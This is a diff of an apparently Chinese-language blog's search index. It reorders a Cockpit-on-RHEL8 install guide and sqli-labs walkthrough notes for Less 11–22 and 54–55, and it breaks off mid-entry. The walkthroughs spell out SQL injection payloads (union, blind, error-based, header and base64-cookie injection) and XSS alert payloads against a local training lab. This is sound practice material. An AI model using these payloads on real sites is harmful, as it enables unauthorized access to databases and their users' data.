@@ -53,32 +53,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Cockpit For RHEL8</title>
-    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
-    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
-<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
-</blockquote>
-<a id="more"></a>
-
-<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
-<p>如果是RHEL7的话则需要添加Extras软件库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
-
-
-<hr>
-<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
-<hr>
-<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
-<p>且使用系统用户帐户和密码登录。</p>
-<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
-<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF[GKCTF2020]老八小超市儿</title>
     <url>/2020/09/18/GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/</url>
     <content><![CDATA[<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><a id="more"></a>
@@ -105,136 +79,29 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab Less 11-Less 22</title>
-    <url>/2020/08/30/sqli-lab-Less-11-Less-22/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a>
-<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>首先测试语句闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>得到报错信息提示</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-<p>大致推断其sql查询语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> UNAME<span class="operator">=</span><span class="string">&#x27;uname&#x27;</span>,PASSWD<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>在PASSWD构造闭合，进行注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT DATABASE(),USER() -- JDNJD </span></span><br></pre></td></tr></table></figure>
-<p>成功，然后扔sqlmap</p>
+    <title>Cockpit For RHEL8</title>
+    <url>/2020/03/05/Cockpit-For-RHEL8/</url>
+    <content><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><blockquote>
+<p><a href="https://cockpit-project.org/">Cockpit</a> : The <a href="https://cockpit-project.org/#easy-to-use">easy-to-use</a>, <a href="https://cockpit-project.org/#integrated">integrated</a>, <a href="https://cockpit-project.org/#glanceable">glanceable</a>, and <a href="https://cockpit-project.org/#open-ended">open</a> web-based interface for your servers .</p>
+</blockquote>
+<a id="more"></a>
+
+<p>在RHEL8上自动安装了Cockpit，因此不需要添加任何非默认的软件库。</p>
+<p>如果是RHEL7的话则需要添加Extras软件库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo subscription-manager repos --enable rhel-7-server-extras-rpms</span><br></pre></td></tr></table></figure>
+
+
 <hr>
-<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错信息</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>构造闭合注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) UNION SELECT DATABASE(),USER() -- sdk </span><br></pre></td></tr></table></figure>
-<p>成功，扔sqlmap</p>
+<h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum install cockpit -y 		&#x2F;&#x2F;安装Cockpit</span><br><span class="line"></span><br><span class="line">$ sudo systemctl enable --now cockpit.socket 		&#x2F;&#x2F;设置开机自启动</span><br><span class="line"></span><br><span class="line">$ sudo firewall-cmd --add-service&#x3D;cockpit --permanent 		&#x2F;&#x2F;打开防火墙放行Cockpit</span><br></pre></td></tr></table></figure>
 <hr>
-<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) UNION SELECT USER(),DATABASE() -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>界面不再回显信息<br>但是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>所以进行盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) AND LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>返回是错误，检查原因，是因为passwd并不正确，所以使用</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) OR LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1111</span>&quot; OR LENGTH(DATABASE())=8 -- SJSN </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>这里不再提示错误的语句只返回slap.jpg</p>
-<p>开始手工fuzzing闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 -- sjjs </span></span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg<br>开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR LENGTH(DATABASE())=8 -- sjjs </span></span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同样开始fuzzing测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR 1=1 -- DDD </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg</p>
-<p>开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR LENGTH(DATABASE())=8 -- DDD </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这里可以看到是密码更新的一关<br>首先输入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>返回flag1.jpg是密码更新成功</p>
-<p>输入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; &amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>返回slap1.jpg提示<code>BUG OFF YOU SILLY DUMB HACKER</code><br>输入    </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="string">&#x27; &amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>返回报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</code></p>
-<p>看来是passwd字段存在注入，<br>开始构造报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPATDEXML(1,CONCAT(0X74,(SELECT DATABASE()),0X74),1) -- DJD</span></span><br></pre></td></tr></table></figure>
-<p>爆出错误</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FUNCTION</span> security.UPATDEXML does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure>
-<p>爆出数据库名，成功</p>
-<hr>
-<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>首先输入错误的密码，页面依旧显示ip，输入正确的密码后页面显示User Agent<br>发现直接显示user agent尝试xss</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(alert(<span class="regexp">/1/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>弹出页面成功<br>开始测试用户名密码的注入，fuzzing后无结果，既然页面要返回user agent，必定要做处理</p>
-<p>测试user agent字段的闭合方式测试出是单引号</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) -- SHDH </span></span><br></pre></td></tr></table></figure>
-<p>页面依旧正常并没有延时，查阅资料后发现等如下闭合单引号</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>
-<p>成功延时，翻阅源代码后发现</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	$IP <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">			mysql_query($<span class="keyword">insert</span>);</span><br></pre></td></tr></table></figure>
-<p>可见这里对于传入的uname和passwd值做了一个过滤，而对于uagent则没有防护，引起http头注入</p>
-<hr>
-<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>根据Less-18的经验很快确定是Referer头的注入，且依旧未对内容进行实体化，造成xss</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: http://192.168.98.133/sqli/Less-19/ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>根据Less-18的闭合思路</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合成功</p>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; OR UPADTAXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功爆出<code>FUNCTION security.UPADTAXML does not exist</code><br>成功</p>
-<hr>
-<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>关卡提示是Cookies注入，首先测试一下，发现会跳转<br>慢慢放包发现</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli/Less-20/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.98.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.98.133/sqli/Less-20/index.php</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-<p>放过后页面提示</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">YOUR IP ADDRESS IS : 192.168.98.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE</span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 30 Aug 2020 - 15:23:53</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:11111</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure>
-<p>又是一堆没有过滤，也能插xss</p>
-<p>我们把注意力放在cookies上<br>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin <span class="string">&#x27; or extractvalue(1,concat(user(),0x7e,database())) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>返回<code>Issue with your mysql: XPATH syntax error: &#39;@localhost~security&#39;</code><br>成功</p>
-<p>接下来试试前一个登录页面是否存在注入，发现突破不了<br>一打开源码，果然，又有过滤。。。。。</p>
-<hr>
-<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这次果断不测试前面，肯定有过滤直接走后面流程<br>页面中又是熟悉的xss的香味，可惜是x自己<br>看到请求包可以很明显的看到不同</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure>
-<p>通过base64解码可知内容<code>admin</code></p>
-<p>嗯开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>加密后<br><code>JyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</code><br>爆出错误<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>成功</p>
-<p>这里再对user agent进行注入，发现失败</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure>
-<p>这里作者并未进行sql操作，只是直接打印</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
-<p>而对于cookee则是进行了查询，且这里的cookee只是简单进行了base64加密，而并未进行过滤操作</p>
-<hr>
-<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这里依旧是一个cookies的注入<br>首先根据Less-21的payload直接插</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3DJyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
-<p>失败<br>换个闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
-<p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p>
-<hr>
+<h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><p>如果服务器上已经安装了Cockpit，则将Web浏览器指向： <strong>https://</strong> <strong>IP:9090</strong></p>
+<p>且使用系统用户帐户和密码登录。</p>
+<p><img src="https://i.loli.net/2020/03/05/QbFvErRzWBfLpxg.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/03/05/ISqGdka8HfbT67B.png" alt="2.png"></p>
+<p><a href="https://cockpit-project.org/guide/latest/">Cockpit Guide</a></p>
 ]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
       <tags>
-        <tag>笔记</tag>
-        <tag>渗透</tag>
-        <tag>sqli-lab</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -487,90 +354,128 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab Less 54-Less 65</title>
-    <url>/2020/09/10/sqli-lab-Less-54-Less-65/</url>
-    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-54-Less-65"><a href="#Sqli-lab-过关笔记-Less-54-Less-65" class="headerlink" title="Sqli-lab 过关笔记 Less 54-Less 65"></a>Sqli-lab 过关笔记 Less 54-Less 65</h1><blockquote>
-<p>Start Challenge</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>The objective of this challenge is to dump the (secret key) from only random table from Database (‘CHALLENGES’) in Less than 10 attempts<br>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.<br>凑，开局暴击，10次机会，错过就重置<br>首先用判断出是单引号闭合，然后使用order by 猜字段名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 100 # 正常</span></span><br></pre></td></tr></table></figure>
-<p>emmm好像order by没用，那就用group by</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; group by 3 # 正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">4</span> # 错误 </span><br></pre></td></tr></table></figure>
-<p>判断出有3个字段</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 #</span></span><br></pre></td></tr></table></figure>
-<p>爆出是<code>challenges</code>为数据库名<br>次数不够了，重置一下开始爆表名和字段名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
-<p>表名<code>zd7hw1th7d</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>zd7hw1th7d<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
-<p><code>id,sessid,secret_K1CG,tryy</code></p>
-<p>让我们查看一下secret_K1CG字段的value</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(0x7e,secret_K1CG,0x7e),3 from zd7hw1th7d  --+</span></span><br></pre></td></tr></table></figure>
-<p>爆出内容<br><code>~apBmqSPfQcta3g5dwVyPoO00~</code><br>key：apBmqSPfQcta3g5dwVyPoO00<br>过关</p>
+    <title>sqli-lab Less 11-Less 22</title>
+    <url>/2020/08/30/sqli-lab-Less-11-Less-22/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>首先测试语句闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>得到报错信息提示</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>大致推断其sql查询语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> UNAME<span class="operator">=</span><span class="string">&#x27;uname&#x27;</span>,PASSWD<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>在PASSWD构造闭合，进行注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT DATABASE(),USER() -- JDNJD </span></span><br></pre></td></tr></table></figure>
+<p>成功，然后扔sqlmap</p>
 <hr>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>开始探测闭合方式（可以用burp爆破）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> (<span class="number">1</span>  正常</span><br></pre></td></tr></table></figure>
-<p>是小括号闭合</p>
